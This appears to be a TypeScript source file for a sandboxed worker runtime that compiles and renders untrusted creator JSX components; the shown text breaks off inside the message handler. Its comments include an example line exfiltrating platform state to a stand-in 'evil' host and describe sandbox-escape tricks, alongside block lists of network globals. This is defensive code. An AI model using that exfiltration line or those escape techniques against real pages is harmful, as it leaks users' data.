/**
 * The Layer 2 runtime: everything that runs inside the sandboxed iframe, split
 * across two realms along the trust line.
 *
 * ## Where creator code runs
 *
 * **In a worker, and only there.** The frame creates a dedicated `Worker` from a
 * blob URL and hands it the component code, the props and the platform state; the
 * worker compiles the JSX, runs the component and its hooks, and answers with a
 * *serializable tree*. It never touches a DOM, because there is none in worker
 * scope, and that closes two whole classes of attack by construction rather than
 * by screening:
 *
 *   - **no navigation.** `location` in a worker is a read-only `WorkerLocation`
 *     for the blob URL, and it is shadowed to `undefined` on top of that. Creator
 *     code cannot point the document anywhere — which is what made the document
 *     realm untenable: `Function('return location')().href = 'https://evil/?d=' +
 *     JSON.stringify(platform)` exfiltrates on the very first render, before any
 *     handshake or teardown can matter.
 *   - **no WebRTC.** `RTCPeerConnection` does not exist in worker scope at all, so
 *     the data channel that walks around `connect-src 'none'` is not there to find.
 *
 *   - and **an infinite loop is survivable**: the frame terminates a worker that
 *     misses its budget. On the renderer thread `while (true) {}` froze the tab;
 *     an opaque origin was never a CPU boundary.
 *
 * ## Where our code runs
 *
 * The **frame** is trusted: it applies the worker's tree to the DOM, forwards the
 * handful of DOM events the subset allows, measures the height, and keeps the port
 * bridge to the parent. That makes the worker→frame tree a trust boundary in its
 * own right, so `applyTree` validates every tag, attribute, url and event name it
 * is given — the worker is running a stranger's program and may say anything.
 *
 * It is also where a `sendTurn` is tied to a human. The frame forwards one only
 * inside the window a forwarded DOM event opens (`GESTURE_MS`, closed by the send
 * itself or by time), because the frame is the only realm that knows whether the
 * reader did anything: the worker cannot tell an effect from a click handler, and
 * the parent cannot see either. A component that calls `sendTurn` from an effect
 * gets silence, which is what stops it and the chat from taking turns forever
 * without a reader.
 *
 * The frame itself is still delivered by `srcdoc` with `sandbox="allow-scripts"`
 * and nothing else — no `allow-same-origin` — so it has an opaque origin: no
 * cookies, no storage, no access to our API or to the embedder's DOM. The CSP
 * closes the rest: no network, no forms, no nested frames, images only from our
 * origin and `data:`, workers only from `blob:`.
 *
 * ## The bridge
 *
 * Parent ↔ frame is a `MessagePort` obtained by a one-shot handshake (`ready` out,
 * a transferred port back) before any creator code exists; see
 * `lib/componentBridge` for why the window channel is not good enough. Frame ↔
 * worker is the worker's own channel, which nothing else can address.
 *
 * ## Why the runtimes are functions that get stringified
 *
 * Both are inlined — the frame into the srcdoc, the worker into a blob the frame
 * builds — via `Function.prototype.toString`, so each must be **completely
 * self-contained**: no imports, no references to anything outside its own body, and
 * no syntax the bundler would rewrite into a call to an external helper (so: no
 * object spread, no optional chaining, no classes, no async). Writing them as real
 * functions rather than template strings keeps them type-checked and lets the tests
 * drive the exact source that ships.
 */

import { MAX_COMPONENT_TURN_LENGTH, MAX_DIRECTIONS_LENGTH } from '@shizue/core/component';

/** Both runtimes are written loosely: they are erased to plain JavaScript anyway. */
type Any = any;

/**
 * The caps both realms truncate to. Neither can import them — they are stringified
 * — so they arrive as an argument, interpolated from the one declaration in
 * `@shizue/core`.
 */
interface RuntimeLimits {
  /** Characters of turn text, and of a suggestion. */
  turn: number;
  /** Characters of a ruling attached to a turn. */
  directions: number;
}

const LIMITS: RuntimeLimits = {
  turn: MAX_COMPONENT_TURN_LENGTH,
  directions: MAX_DIRECTIONS_LENGTH,
};

/** Platform state the parent injects as the `platform` prop. */
export interface PlatformContext {
  /** Path-derived chat variables — the Layer 1 fold. */
  variables: Record<string, string>;
  /** Relationship axes 0-100, or null while the chat has none. */
  relationship: Record<string, number> | null;
  /** User turns taken on this branch. */
  turn: number;
  char: string;
  user: string;
  /** Asset url by slug. */
  assets: Record<string, string>;
}

/** Parent → frame, over the port. The only message the frame accepts on it. */
export interface InitMessage {
  type: 'init';
  code: string;
  name: string;
  props: Record<string, unknown>;
  platform: PlatformContext;
  /** Localized strings the frame cannot look up itself. */
  labels: { error: string };
}

/**
 * Frame → parent. `ready` is the handshake and the only one that goes over the
 * window; the rest go over the port, and nothing else is honoured either way.
 *
 * `sendTurn` is the only one that can change the chat, and it is the only one
 * that is not granted by default: the card has to declare the capability, the
 * reader has to have consented, and the page still rate-limits it.
 */
export type FrameMessage =
  | { type: 'ready' }
  | { type: 'resize'; height: number }
  | { type: 'suggestInput'; text: string }
  | { type: 'sendTurn'; text: string; directions?: string };

/**
 * Frame → worker. `render` (re)mounts, `event` delivers one DOM event.
 * Worker → frame: `tree` (a full serializable render), `error`, `suggestInput`,
 * `sendTurn`.
 */
export type WorkerRequest =
  | { type: 'render'; code: string; name: string; props: Record<string, unknown>; platform: PlatformContext }
  | { type: 'event'; path: string; event: string; payload: Record<string, unknown> };

/** Worker → frame. A `tree` ends a turn; a suggestion or a send does not. */
export type WorkerResponse =
  | { type: 'tree'; tree: unknown }
  | { type: 'error'; message: string }
  | { type: 'suggestInput'; text: string }
  | { type: 'sendTurn'; text: string; directions?: string };

/* eslint-disable */
/**
 * Everything below runs in the worker: the compiler, the components, the hooks.
 * Self-contained by contract — see the module comment. `scope` is the worker's
 * global (`self`); the tests pass a stand-in so they can drive the same source.
 * `limits` carries the caps this realm cannot import.
 */
function componentWorkerRuntime(scope: Any, limits: RuntimeLimits): void {
  'use strict';

  /**
   * The channel out, **bound** at boot, before a character of creator code exists.
   *
   * Captured rather than looked up per call, because `postMessage` is itself
   * blanked below: the runtime keeps the only reference to it, so a component
   * that reaches for the name — including through `Function('return
   * postMessage')()` — finds `undefined`. Every bridge message is forgeable
   * otherwise, and `sendTurn` is one of them.
   *
   * Bound rather than invoked as `channel.call(scope, …)`, because
   * `Function.prototype.call` is an ordinary mutable property and creator code
   * runs *first* — the module body and the initial render both happen before the
   * runtime posts its first tree. A component that replaces
   * `Function.prototype.call` with a trap would receive the native `postMessage`
   * as `this` and the worker global as an argument, which is the whole channel and
   * the whole scope handed over. A bound function's [[Call]] consults nothing:
   * `.bind` here is safe precisely because nothing untrusted has run yet.
   */
  const post = scope.postMessage.bind(scope);

  /**
   * `Function(…)` for the module factory, bound at boot for the same reason:
   * `buildFactory` compiles again whenever the code changes, which is long after
   * a component could have replaced `Function.prototype.apply` with a trap of its
   * own. It is the last `.call`/`.apply` on the path creator code can reach.
   */
  const makeFunction: Any = Function.prototype.apply.bind(Function);

  /**
   * Globals a component has no business with, shadowed as own properties of the
   * worker's global object.
   *
   * Unlike the parameter-shadowing in `buildFactory`, this survives
   * `Function('return fetch')()`: that resolves against the global object, and an
   * own `undefined` property shadows the one on `WorkerGlobalScope.prototype`.
   * `location` is here too — in a worker it is a read-only `WorkerLocation` for a
   * `blob:` url and cannot navigate anything even unshadowed, but a component
   * should not be reading it either.
   */
  const BLOCKED = [
    'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'importScripts',
    'location', 'navigator', 'caches', 'indexedDB', 'BroadcastChannel',
    'Worker', 'SharedWorker', 'ServiceWorker', 'setTimeout', 'setInterval',
    'requestAnimationFrame', 'queueMicrotask', 'crypto', 'performance', 'origin',
    'postMessage',
  ];
  for (let b = 0; b < BLOCKED.length; b += 1) {
    try {
      Object.defineProperty(scope, BLOCKED[b] as Any, {
        value: undefined,
        configurable: true,
        writable: true,
      });
    } catch (error) {
      // Non-configurable in this engine; the parameter list still hides the name.
    }
  }

  /* ------------------------------------------------------------ the subset */

  /** Blanks the insides of strings, template literals and comments, keeping length. */
  function stripLiterals(source: string): string {
    let out = '';
    for (let i = 0; i < source.length; i += 1) {
      const char = source.charAt(i);
      const next = source.charAt(i + 1);
      if (char === '/' && next === '/') {
        const end = source.indexOf('\n', i);
        const stop = end === -1 ? source.length : end;
        out += new Array(stop - i + 1).join(' ');
        i = stop - 1;
        continue;
      }
      if (char === '/' && next === '*') {
        const end = source.indexOf('*/', i + 2);
        const stop = end === -1 ? source.length : end + 2;
        out += new Array(stop - i + 1).join(' ');
        i = stop - 1;
        continue;
      }
      if (char === '"' || char === "'" || char === '`') {
        out += char;
        let j = i + 1;
        for (; j < source.length; j += 1) {
          if (source.charAt(j) === '\\') {
            out += '  ';
            j += 1;
            continue;
          }
          if (source.charAt(j) === char) break;
          out += ' ';
        }
        out += j < source.length ? char : '';
        i = j;
        continue;
      }
      out += char;
    }
    return out;
  }

  /**
   * The same rules `@shizue/core/component` applies in the editor, restated here
   * because this script may not import anything. Kept deliberately identical: a
   * component the editor called clean must not fail at render time.
   */
  function subsetViolations(source: string): string[] {
    const code = stripLiterals(source);
    const rules: Any[] = [
      ['import', /\bimport\b|\brequire\s*\(/],
      ['timer', /\b(?:setTimeout|setInterval|requestAnimationFrame|queueMicrotask)\b/],
      ['network', /\b(?:fetch|XMLHttpRequest|WebSocket|EventSource|navigator)\b/],
      ['storage', /\b(?:localStorage|sessionStorage|indexedDB|cookie)\b/],
      ['eval', /\beval\s*\(|\bnew\s+Function\b/],
      ['class_name', /\bclassName\b|\bclass\s*=\s*["']/],
      ['string_style', /\bstyle\s*=\s*(?:["']|\{\s*["'])/],
    ];
    const found: string[] = [];
    for (let i = 0; i < rules.length; i += 1) {
      if (rules[i][1].test(code)) found.push(rules[i][0]);
    }
    const allowed = ['useState', 'useEffect', 'useMemo', 'useCallback', 'useRef'];
    const hooks = /\buse[A-Z][A-Za-z0-9_]*\s*\(/g;
    for (let match = hooks.exec(code); match; match = hooks.exec(code)) {
      const name = match[0].slice(0, match[0].search(/\s*\(/));
      if (allowed.indexOf(name) === -1) {
        found.push('unknown_hook:' + name);
        break;
      }
    }
    return found;
  }

  /** Capitalized declarations — the names a call code may resolve to. */
  function declaredNames(source: string): string[] {
    const code = stripLiterals(source);
    const pattern = /(?:\bfunction\s+([A-Z][A-Za-z0-9_]*)\s*\()|(?:\b(?:const|let|var)\s+([A-Z][A-Za-z0-9_]*)\s*=)/g;
    const names: string[] = [];
    for (let match = pattern.exec(code); match; match = pattern.exec(code)) {
      const name = match[1] || match[2];
      if (name && names.indexOf(name) === -1) names.push(name);
      if (names.length >= 32) break;
    }
    return names;
  }

  /* ---------------------------------------------------------- the compiler */

  /**
   * JSX to `h(…)` calls. A scanner rather than a parser: it copies JavaScript
   * through untouched and only takes over at a `<` that can only be an element
   * (an expression position followed by a name, a `/`, or `>`), which is the one
   * ambiguity JSX has. Strings, template literals, comments and regex literals are
   * copied verbatim so a `<` inside them is never mistaken for markup.
   */
  function compileJsx(source: string): string {
    let pos = 0;
    let out = '';

    function fail(message: string): never {
      throw new Error('JSX syntax: ' + message);
    }

    function skipSpace(): void {
      while (pos < source.length && /\s/.test(source.charAt(pos))) pos += 1;
    }

    function readString(quote: string): string {
      const start = pos;
      pos += 1;
      while (pos < source.length) {
        const char = source.charAt(pos);
        if (char === '\\') {
          pos += 2;
          continue;
        }
        pos += 1;
        if (char === quote) return source.slice(start, pos);
      }
      return fail('unterminated string');
    }

    function readTemplate(): string {
      const start = pos;
      pos += 1;
      let depth = 0;
      while (pos < source.length) {
        const char = source.charAt(pos);
        if (char === '\\') {
          pos += 2;
          continue;
        }
        if (depth === 0 && char === '`') {
          pos += 1;
          return source.slice(start, pos);
        }
        if (char === '$' && source.charAt(pos + 1) === '{') {
          depth += 1;
          pos += 2;
          continue;
        }
        if (depth > 0 && char === '{') depth += 1;
        else if (depth > 0 && char === '}') depth -= 1;
        pos += 1;
      }
      return fail('unterminated template literal');
    }

    function readRegex(): string {
      const start = pos;
      pos += 1;
      let inClass = false;
      while (pos < source.length) {
        const char = source.charAt(pos);
        if (char === '\\') {
          pos += 2;
          continue;
        }
        if (char === '[') inClass = true;
        else if (char === ']') inClass = false;
        else if (char === '\n') return fail('unterminated regular expression');
        else if (char === '/' && !inClass) {
          pos += 1;
          while (pos < source.length && /[a-z]/i.test(source.charAt(pos))) pos += 1;
          return source.slice(start, pos);
        }
        pos += 1;
      }
      return fail('unterminated regular expression');
    }

    /** Body of a `{…}`, with `pos` left after the closing brace. */
    function readBraced(): string {
      const start = pos;
      let depth = 0;
      while (pos < source.length) {
        const char = source.charAt(pos);
        if (char === '"' || char === "'") {
          readString(char);
          continue;
        }
        if (char === '`') {
          readTemplate();
          continue;
        }
        if (char === '/' && source.charAt(pos + 1) === '/') {
          const line = source.indexOf('\n', pos);
          pos = line === -1 ? source.length : line;
          continue;
        }
        if (char === '/' && source.charAt(pos + 1) === '*') {
          const end = source.indexOf('*/', pos + 2);
          pos = end === -1 ? source.length : end + 2;
          continue;
        }
        if (char === '{') depth += 1;
        else if (char === '}') {
          depth -= 1;
          if (depth === 0) {
            pos += 1;
            return source.slice(start + 1, pos - 1);
          }
        }
        pos += 1;
      }
      return fail('unclosed {');
    }

    /** True when the `<` (or `/`) at `pos` can only start an element (or a regex). */
    function expressionContext(): boolean {
      let j = out.length - 1;
      while (j >= 0 && /\s/.test(out.charAt(j))) j -= 1;
      if (j < 0) return true;
      if ('([{,;:=+-*/%!&|?<>~^'.indexOf(out.charAt(j)) !== -1) return true;
      const word = /[A-Za-z_$][A-Za-z0-9_$]*$/.exec(out.slice(0, j + 1));
      if (!word) return false;
      const keywords = [
        'return', 'typeof', 'instanceof', 'in', 'of', 'do', 'else', 'case',
        'new', 'void', 'delete', 'yield', 'await',
      ];
      return keywords.indexOf(word[0]) !== -1;
    }

    /**
     * JSX text semantics: a run of whitespace containing a newline at either end
     * of a line is layout, not content, so it is dropped and the rest joined with
     * single spaces. Without this every indented element would render its indent.
     */
    function trimJsxText(text: string): string {
      const lines = text.split('\n');
      const parts: string[] = [];
      for (let i = 0; i < lines.length; i += 1) {
        let line = lines[i] as string;
        if (i > 0) line = line.replace(/^\s+/, '');
        if (i < lines.length - 1) line = line.replace(/\s+$/, '');
        if (line) parts.push(line);
      }
      return parts.join(' ');
    }

    function tagExpression(name: string): string {
      // Lowercase or dashed is an HTML tag; capitalized is the identifier the
      // creator declared, and `A.B` is a member expression, both left as code.
      if (/^[a-z]/.test(name) || name.indexOf('-') !== -1) return JSON.stringify(name);
      return name;
    }

    function propsExpression(attributes: Any[]): string {
      if (attributes.length === 0) return 'null';
      const parts: string[] = [];
      for (let i = 0; i < attributes.length; i += 1) {
        const attribute = attributes[i];
        if (attribute.spread !== undefined) parts.push('...(' + attribute.spread + ')');
        else parts.push(JSON.stringify(attribute.key) + ':' + attribute.value);
      }
      return '{' + parts.join(',') + '}';
    }

    function readTagName(): string {
      let name = '';
      while (pos < source.length && /[A-Za-z0-9_$.:-]/.test(source.charAt(pos))) {
        name += source.charAt(pos);
        pos += 1;
      }
      if (!name) return fail('expected a tag name');
      return name;
    }

    function parseChildren(name: string): string {
      let parts = '';
      let text = '';
      for (;;) {
        if (pos >= source.length) return fail('unclosed <' + name + '>');
        const char = source.charAt(pos);
        if (char === '{' || char === '<') {
          const value = trimJsxText(text);
          text = '';
          if (value) parts += ',' + JSON.stringify(value);
        }
        if (char === '{') {
          const inner = readBraced();
          // `{/* a comment */}` is not a child: comments blank out entirely.
          if (/\S/.test(stripLiterals(inner))) parts += ',(' + compileJsx(inner) + ')';
          continue;
        }
        if (char === '<') {
          if (source.charAt(pos + 1) === '/') {
            const close = source.indexOf('>', pos);
            if (close === -1) return fail('unclosed closing tag');
            pos = close + 1;
            return parts;
          }
          parts += ',' + parseElement();
          continue;
        }
        text += char;
        pos += 1;
      }
    }

    function parseElement(): string {
      pos += 1;
      if (source.charAt(pos) === '>') {
        pos += 1;
        return 'h(Fragment,null' + parseChildren('') + ')';
      }
      const name = readTagName();
      const attributes: Any[] = [];
      for (;;) {
        skipSpace();
        if (source.charAt(pos) === '/' && source.charAt(pos + 1) === '>') {
          pos += 2;
          return 'h(' + tagExpression(name) + ',' + propsExpression(attributes) + ')';
        }
        if (source.charAt(pos) === '>') {
          pos += 1;
          return (
            'h(' + tagExpression(name) + ',' + propsExpression(attributes) + parseChildren(name) + ')'
          );
        }
        if (pos >= source.length) return fail('unclosed <' + name + '>');
        if (source.charAt(pos) === '{') {
          attributes.push({ spread: compileJsx(readBraced().replace(/^\s*\.\.\./, '')) });
          continue;
        }
        let attribute = '';
        while (pos < source.length && /[A-Za-z0-9_$:-]/.test(source.charAt(pos))) {
          attribute += source.charAt(pos);
          pos += 1;
        }
        if (!attribute) return fail('bad attribute in <' + name + '>');
        skipSpace();
        if (source.charAt(pos) !== '=') {
          attributes.push({ key: attribute, value: 'true' });
          continue;
        }
        pos += 1;
        skipSpace();
        const char = source.charAt(pos);
        if (char === '"' || char === "'") {
          const quoted = readString(char);
          attributes.push({ key: attribute, value: JSON.stringify(quoted.slice(1, -1)) });
        } else if (char === '{') {
          attributes.push({ key: attribute, value: '(' + compileJsx(readBraced()) + ')' });
        } else if (char === '<') {
          attributes.push({ key: attribute, value: parseElement() });
        } else {
          return fail('bad value for ' + attribute);
        }
      }
    }

    while (pos < source.length) {
      const char = source.charAt(pos);
      if (char === '/' && source.charAt(pos + 1) === '/') {
        const line = source.indexOf('\n', pos);
        const stop = line === -1 ? source.length : line;
        out += source.slice(pos, stop);
        pos = stop;
        continue;
      }
      if (char === '/' && source.charAt(pos + 1) === '*') {
        const end = source.indexOf('*/', pos + 2);
        const stop = end === -1 ? source.length : end + 2;
        out += source.slice(pos, stop);
        pos = stop;
        continue;
      }
      if (char === '"' || char === "'") {
        out += readString(char);
        continue;
      }
      if (char === '`') {
        out += readTemplate();
        continue;
      }
      if (char === '/' && expressionContext()) {
        out += readRegex();
        continue;
      }
      if (char === '<' && expressionContext() && /[A-Za-z_$>]/.test(source.charAt(pos + 1))) {
        out += parseElement();
        continue;
      }
      out += char;
      pos += 1;
    }
    return out;
  }

  /* ------------------------------------------------------------ the render */

  /** Sentinel for `<>…</>`. */
  const FRAGMENT: Any = { fragment: true };

  /** Style properties whose numbers are not pixels. */
  const UNITLESS: Any = {
    opacity: 1, zIndex: 1, flex: 1, flexGrow: 1, flexShrink: 1, fontWeight: 1,
    lineHeight: 1, order: 1, zoom: 1, gridColumn: 1, gridRow: 1, columnCount: 1,
    aspectRatio: 1, scale: 1,
  };

  /** Elements a component may not ask for. The frame refuses them again. */
  const FORBIDDEN_TAGS: Any = {
    script: 1, iframe: 1, frame: 1, frameset: 1, object: 1, embed: 1,
    link: 1, meta: 1, base: 1, form: 1, applet: 1,
  };

  const EVENTS = [
    'click', 'dblclick', 'input', 'change', 'keydown', 'keyup',
    'focus', 'blur', 'mousedown', 'mouseup', 'mouseenter', 'mouseleave',
  ];

  /** Nodes one render may produce, and renders one turn may take. */
  const MAX_NODES = 5000;
  const MAX_PASSES = 20;

  function h(type: Any, props: Any): Any {
    const children: Any[] = [];
    for (let i = 2; i < arguments.length; i += 1) children.push(arguments[i]);
    return { type: type, props: props || {}, children: flatten(children, []) };
  }

  function flatten(items: Any[], out: Any[]): Any[] {
    for (let i = 0; i < items.length; i += 1) {
      const item = items[i];
      // false/null/undefined are how JSX writes "nothing", as in React.
      if (item === null || item === undefined || item === false || item === true) continue;
      if (Array.isArray(item)) flatten(item, out);
      else out.push(item);
    }
    return out;
  }

  /* --------------------------------------------------------------- state */

  /**
   * Hook state, keyed by the path of the component in the tree rather than by an
   * instance: the tree is rebuilt from scratch on every render (it has to be —
   * what leaves here is data, not a mounted DOM), and a path is what survives
   * that. Paths are derived from source positions, so they are stable across
   * renders in the same way index-based reconciliation is.
   */
  let slots: Any = {};
  let live: Any = {};
  let handlers: Any = {};
  let effects: Any[] = [];
  let current: Any = null;
  let nodeCount = 0;

  let component: Any = null;
  let componentProps: Any = {};
  let platform: Any = null;
  let compiledCode: string | null = null;
  let compiledExports: Any = null;
  let dirty = false;
  let scheduled = false;

  function slotFor(): Any {
    if (!current) throw new Error('A hook was called outside a component');
    const list = slots[current.path];
    const index = current.index;
    current.index = index + 1;
    if (!list[index]) list[index] = {};
    return list[index];
  }

  function sameDeps(a: Any, b: Any): boolean {
    if (!a || !b || a.length !== b.length) return false;
    for (let i = 0; i < a.length; i += 1) if (!Object.is(a[i], b[i])) return false;
    return true;
  }

  function useState(initial: Any): Any {
    const slot = slotFor();
    if (!slot.ready) {
      slot.ready = true;
      slot.value = typeof initial === 'function' ? initial() : initial;
      slot.set = function (next: Any): void {
        const value = typeof next === 'function' ? next(slot.value) : next;
        if (Object.is(value, slot.value)) return;
        slot.value = value;
        schedule();
      };
    }
    return [slot.value, slot.set];
  }

  function useRef(initial: Any): Any {
    const slot = slotFor();
    if (!slot.ready) {
      slot.ready = true;
      slot.value = { current: initial };
    }
    return slot.value;
  }

  function useMemo(factory: Any, deps: Any): Any {
    const slot = slotFor();
    if (!slot.ready || !sameDeps(slot.deps, deps)) {
      slot.ready = true;
      slot.deps = deps;
      slot.value = factory();
    }
    return slot.value;
  }

  function useCallback(callback: Any, deps: Any): Any {
    // Not `useMemo(...)` by name. React Refresh keys on `use*` callees, and a
    // hook that calls one gets instrumented with module-scope helpers — which
    // this function must never acquire, because it travels into the sandbox as
    // `toString()` text where no module scope exists. The alias keeps the call
    // out of the transform's sight; `componentWorkerSource` guards the rest.
    const memo = useMemo;
    return memo(function () {
      return callback;
    }, deps);
  }

  function useEffect(effect: Any, deps: Any): void {
    const slot = slotFor();
    if (slot.ready && sameDeps(slot.deps, deps)) return;
    slot.ready = true;
    slot.deps = deps;
    effects.push({ slot: slot, effect: effect });
  }

  function runEffects(): void {
    const queue = effects;
    effects = [];
    for (let i = 0; i < queue.length; i += 1) {
      const entry = queue[i];
      if (typeof entry.slot.cleanup === 'function') {
        try {
          entry.slot.cleanup();
        } catch (error) {
          // One bad cleanup must not stop the queue.
        }
      }
      const cleanup = entry.effect();
      entry.slot.cleanup = typeof cleanup === 'function' ? cleanup : null;
    }
  }

  /** Components that were not rendered this pass are unmounted: run their cleanups. */
  function sweep(): void {
    const paths = Object.keys(slots);
    for (let i = 0; i < paths.length; i += 1) {
      if (live[paths[i] as Any]) continue;
      const list = slots[paths[i] as Any];
      for (let j = 0; j < list.length; j += 1) {
        const slot = list[j];
        if (slot && typeof slot.cleanup === 'function') {
          try {
            slot.cleanup();
          } catch (error) {
            // As above.
          }
        }
      }
      delete slots[paths[i] as Any];
    }
  }

  /* ---------------------------------------------------------- the tree out */

  function hyphenate(name: string): string {
    if (name.charAt(0) === '-') return name;
    return name.replace(/[A-Z]/g, function (letter) {
      return '-' + letter.toLowerCase();
    });
  }

  function styleOf(style: Any): Any {
    if (typeof style === 'string') throw new Error('style must be an object, not a string');
    const out: Any = {};
    if (!style || typeof style !== 'object') return out;
    for (const name in style) {
      const value = style[name];
      if (value === null || value === undefined || value === false) continue;
      // A bare number means pixels, as in React. The conversion happens here so
      // the frame only ever sets a property to a string it was handed.
      out[hyphenate(name)] = typeof value === 'number' && !UNITLESS[name] ? value + 'px' : String(value);
    }
    return out;
  }

  function renderChildren(children: Any[], path: string): Any[] {
    const out: Any[] = [];
    for (let i = 0; i < children.length; i += 1) {
      const child = renderNode(children[i], path + '.' + i);
      if (child !== null) out.push(child);
    }
    return out;
  }

  function renderNode(vnode: Any, path: string): Any {
    if (vnode === null || vnode === undefined || typeof vnode === 'boolean') return null;
    if (typeof vnode === 'string' || typeof vnode === 'number') return String(vnode);

    nodeCount += 1;
    if (nodeCount > MAX_NODES) throw new Error('The component rendered more than ' + MAX_NODES + ' nodes');

    const type = vnode.type;
    if (typeof type === 'function') {
      live[path] = true;
      if (!slots[path]) slots[path] = [];
      const previous = current;
      current = { path: path, index: 0 };
      let out: Any;
      try {
        out = type(Object.assign({}, vnode.props, { children: vnode.children }));
      } finally {
        current = previous;
      }
      return renderNode(out, path + '.c');
    }

    const key = vnode.props.key === undefined ? null : String(vnode.props.key);
    if (type === FRAGMENT) {
      // A fragment keeps a node of its own so the frame's diff stays positional;
      // it becomes a `display: contents` wrapper there.
      return { tag: null, key: key, children: renderChildren(vnode.children, path) };
    }
    if (typeof type !== 'string') throw new Error('A component must be a function');
    if (FORBIDDEN_TAGS[type.toLowerCase()]) throw new Error('<' + type + '> is not allowed in a component');

    const node: Any = { tag: type, key: key, path: path, attrs: {}, style: {}, props: {}, on: [], children: [] };
    for (const name in vnode.props) {
      const value = vnode.props[name];
      if (name === 'children' || name === 'key') continue;
      if (name === 'className' || name === 'class') {
        throw new Error('className is outside the subset — use style={{ … }}');
      }
      if (name === 'dangerouslySetInnerHTML') {
        throw new Error('dangerouslySetInnerHTML is outside the subset');
      }
      if (name === 'style') {
        node.style = styleOf(value);
        continue;
      }
      if (/^on[A-Z]/.test(name)) {
        const event = name.slice(2).toLowerCase();
        if (typeof value !== 'function' || EVENTS.indexOf(event) === -1) continue;
        handlers[path + '|' + event] = value;
        node.on.push(event);
        continue;
      }
      if (name === 'value' || name === 'checked') {
        node.props[name] = value === null || value === undefined ? '' : value;
        continue;
      }
      if (value === null || value === undefined || value === false) continue;
      if (typeof value === 'function' || typeof value === 'object') continue;
      node.attrs[name] = value === true ? '' : String(value);
    }
    node.children = renderChildren(vnode.children, path);
    return node;
  }

  /** One full render, from the root component, into a tree the frame can apply. */
  function renderPass(): Any {
    live = {};
    handlers = {};
    nodeCount = 0;
    const tree = renderNode({ type: component, props: componentProps, children: [] }, 'r');
    sweep();
    return tree;
  }

  /**
   * A render and the effects it queued, repeated while an effect keeps changing
   * state. Every turn the frame starts is on a wall-clock budget over there, so an
   * effect loop is stopped by termination rather than by a counter — this one only
   * keeps a *finite* loop from posting twenty trees.
   */
  function commit(): void {
    for (let pass = 0; pass < MAX_PASSES; pass += 1) {
      dirty = false;
      const tree = renderPass();
      post({ type: 'tree', tree: tree });
      runEffects();
      if (!dirty) return;
    }
    throw new Error('The component kept re-rendering itself');
  }

  /** A state change outside a turn (from a promise, say) still reaches the screen. */
  function schedule(): void {
    dirty = true;
    if (scheduled || current) return;
    scheduled = true;
    Promise.resolve().then(function () {
      scheduled = false;
      if (!dirty || !component) return;
      try {
        commit();
      } catch (error) {
        fail(error);
      }
    });
  }

  function fail(error: Any): void {
    const message = error && error.message ? error.message : String(error);
    post({ type: 'error', message: String(message).slice(0, 500) });
  }

  /* ------------------------------------------------------------- the entry */

  function buildPlatform(source: Any): Any {
    const value = source && typeof source === 'object' ? source : {};
    return {
      variables: value.variables || {},
      relationship: value.relationship || null,
      turn: typeof value.turn === 'number' ? value.turn : 0,
      char: typeof value.char === 'string' ? value.char : '',
      user: typeof value.user === 'string' ? value.user : '',
      assets: value.assets || {},
      /** Fills the reader's composer. Sending stays the reader's decision. */
      suggestInput: function (text: Any): void {
        post({ type: 'suggestInput', text: String(text).slice(0, limits.turn) });
      },
      /**
       * Takes the turn itself, with an optional ruling to hand the model
       * (`{ directions }`). Everything downstream may refuse it — the card must
       * declare the capability, the reader must have granted it in this chat, and
       * the page allows one per model turn — so a component that calls this is
       * asking, not doing. The caps are the ones `@shizue/core` declares and the
       * columns downstream are sized for.
       */
      sendTurn: function (text: Any, options: Any): void {
        const message: Any = { type: 'sendTurn', text: String(text).slice(0, limits.turn) };
        const settings = options && typeof options === 'object' ? options : {};
        if (typeof settings.directions === 'string' && settings.directions) {
          message.directions = settings.directions.slice(0, limits.directions);
        }
        post(message);
      },
    };
  }

  /**
   * Compiles the creator's module and returns what it declared. The globals the
   * subset forbids are parameter names bound to `undefined`, so `fetch(…)` inside
   * a component is a TypeError on a local rather than a request — and the ones
   * that matter are shadowed on the global object as well, above.
   */
  function buildFactory(code: string): Any {
    if (compiledCode === code && compiledExports) return compiledExports;
    const violations = subsetViolations(code);
    if (violations.length > 0) {
      throw new Error('Outside the component subset: ' + violations.join(', '));
    }
    const compiled = compileJsx(code);
    const names = declaredNames(code);
    const exported: string[] = [];
    for (let i = 0; i < names.length; i += 1) {
      exported.push(
        JSON.stringify(names[i]) + ':typeof ' + names[i] + '==="function"?' + names[i] + ':undefined',
      );
    }
    const body = '"use strict";\n' + compiled + '\n;return {' + exported.join(',') + '};';
    const hidden = [
      'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'setTimeout', 'setInterval',
      'requestAnimationFrame', 'queueMicrotask', 'localStorage', 'sessionStorage', 'indexedDB',
      'caches', 'document', 'window', 'parent', 'top', 'self', 'globalThis', 'location',
      'navigator', 'history', 'frames', 'opener', 'Worker', 'importScripts', 'postMessage',
      'alert', 'prompt', 'confirm',
    ];
    const parameters = ['h', 'Fragment', 'useState', 'useEffect', 'useMemo', 'useCallback', 'useRef']
      .concat(hidden)
      .concat([body]);
    const factory = makeFunction(null, parameters as Any);
    compiledExports = factory(h, FRAGMENT, useState, useEffect, useMemo, useCallback, useRef);
    compiledCode = code;
    return compiledExports;
  }

  function onRender(payload: Any): void {
    // Every render starts the component over: hook state belongs to a mount, and
    // the parent re-inits whenever the platform state moves. Unmounting first, so
    // the effects of the mount that is being replaced get their cleanup.
    live = {};
    sweep();
    slots = {};
    live = {};
    effects = [];
    handlers = {};
    dirty = false;
    component = null;

    const code = String(payload.code || '');
    const declared = buildFactory(code);
    const found = declared[String(payload.name)];
    if (typeof found !== 'function') throw new Error('Unknown component: ' + String(payload.name));

    platform = buildPlatform(payload.platform);
    component = found;
    componentProps = Object.assign({}, payload.props || {}, { platform: platform });
    commit();
  }

  function onEvent(payload: Any): void {
    const handler = handlers[String(payload.path) + '|' + String(payload.event)];
    if (typeof handler !== 'function') return;
    const data = payload.payload && typeof payload.payload === 'object' ? payload.payload : {};
    // A plain object, not a DOM event — there is no DOM here. The two no-ops are
    // what circulating components call out of habit.
    handler({
      type: String(payload.event),
      target: { value: data.value, checked: data.checked },
      currentTarget: { value: data.value, checked: data.checked },
      key: data.key,
      preventDefault: function () {},
      stopPropagation: function () {},
    });
    commit();
  }

  scope.onmessage = function (event: Any): void {
    const data = event && event.data;
    if (!data || typeof data !== 'object') return;
    // The liveness answer is the first thing this handler does, before anything
    // a component wrote can run: a worker inside a loop never reaches its event
    // loop, so it cannot answer, and that is the whole proof. (Creator code can
    // reach `postMessage` and forge a pong — but only while it is responsive,
    // which is exactly what the ping is asking.)
    if (data.type === 'ping') {
